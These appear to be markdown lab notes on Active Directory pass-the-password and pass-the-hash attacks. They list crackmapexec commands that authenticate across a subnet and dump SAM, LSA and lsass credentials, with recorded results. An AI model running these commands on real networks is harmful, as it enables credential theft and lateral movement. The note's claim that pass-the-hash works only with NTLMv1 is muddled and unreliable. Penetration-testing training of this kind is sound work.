## Pass Attacks

### Pass the Password
- `crackmapexec smb <subnet> -u <username> -d <domain> -p <password>`

  ![image](https://github.com/user-attachments/assets/1bdef64f-e99a-4001-b7e9-c9b3cc40135b)

- Successful authentication to DC and both workstations
- Local admin on workstations

### Pass the Hash
- Only works with NTLMv1, not v2. v2 can be relayed
- `crackmapexec smb <subnet> -u <username> -H <hash> --local-auth`

  ![image](https://github.com/user-attachments/assets/a908cc65-a783-4e66-8e12-dad41cabd3f9)

- Pwn3d! on both workstations
- DC is not Pw3d! because it is not the correct password

### Other things with crackmapexec
- Dump the SAM: `crackmapexec smb <subnet> -u <username> -H <hash> --local-auth --sam`

  ![image](https://github.com/user-attachments/assets/2d0dafbd-85bd-4f77-a108-697a78a0e6c4)

- Enumerate shares: `crackmapexec smb <subnet> -u <username> -H <hash> --local-auth --shares`

  ![image](https://github.com/user-attachments/assets/b85ef478-ccab-4456-980e-53ba130f19e8)

- Dump the LSA: `crackmapexec smb <subnet> -u <username> -H <hash> --local-auth --lsa`

  ![image](https://github.com/user-attachments/assets/c03c726a-8ae2-49aa-868a-53d14819578c)

- Could potentially crack DDC2 hash
- Dump lsass: `crackmapexec smb <subnet> -u <username> -H <hash> --local-auth -M lsassy`
- Nothing found with lsassy
- CME DB: `cmedb`

  ![image](https://github.com/user-attachments/assets/72e903fa-eebc-4086-865e-69f154eaf606)

